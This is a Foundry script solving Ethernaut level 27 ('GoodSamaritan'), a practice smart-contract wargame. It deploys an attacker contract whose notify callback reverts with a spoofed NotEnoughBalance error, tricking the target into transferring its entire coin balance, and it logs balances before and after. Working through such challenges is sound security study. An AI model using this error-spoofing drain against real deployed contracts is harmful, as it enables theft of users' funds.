// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/27-GoodSamaritan/GoodSamaritan.sol";

contract ExploitScript is Script {
    BadSamaritan BadSamaritanContract;
    GoodSamaritan level27 = GoodSamaritan(payable(0x907657CAB582702A7d697826Eda09677AF359afa));

    function run() public {
        vm.startBroadcast();
        BadSamaritanContract = new BadSamaritan();
        console.log(level27.coin().balances(address(level27.wallet())));
        BadSamaritanContract.attax();
        console.log(level27.coin().balances(address(level27.wallet())));
        console.log(level27.coin().balances(address(BadSamaritanContract)));

        vm.stopBroadcast();
    }
}

contract BadSamaritan {

    error NotEnoughBalance();

    GoodSamaritan goodsamaritan  = GoodSamaritan(0x907657CAB582702A7d697826Eda09677AF359afa); //ethernaut instance address
    function attax() external {
        goodsamaritan.requestDonation();
    }

    function notify(uint256 amount) external pure {
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}
